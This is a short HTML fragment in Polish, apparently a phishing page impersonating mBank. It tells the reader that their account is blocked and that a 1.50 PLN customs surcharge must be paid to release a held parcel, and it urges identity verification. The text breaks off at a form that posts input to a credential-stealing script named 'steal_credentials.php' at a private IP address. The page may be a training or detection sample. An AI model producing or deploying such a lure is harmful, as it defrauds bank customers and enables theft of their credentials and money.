<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Szybka dopłata do paczki - mBank</title>
</head>
<body>

    <h1>Twój panel płatności mBank</h1>
    <p>Uwaga! Twoje <strong>zablokowane konto</strong> wymaga natychmiastowej akcji. <strong>Zweryfikuj tożsamość</strong>.</p>
    <p>Wymagana <strong>dopłata</strong> w kwocie 1.50 PLN, aby Twoja <strong>paczka zatrzymana</strong> przez urząd celny ruszyła dalej.</p>

    <form action="http://192.168.1.55/steal_credentials.php" method="POST">
